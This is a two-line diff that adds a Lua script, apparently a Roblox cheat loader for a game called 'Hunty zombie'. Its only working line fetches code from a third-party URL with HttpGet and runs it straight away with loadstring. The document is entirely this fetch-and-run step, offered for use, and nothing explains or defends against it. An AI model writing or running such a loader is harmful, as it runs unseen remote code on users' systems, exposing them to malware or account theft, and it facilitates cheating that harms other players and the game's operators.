@@ -1,0 +1,2 @@
+-- Hunty zombie 
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/8a926d9a2c254e82ab6b0e0d1dc68903"))()
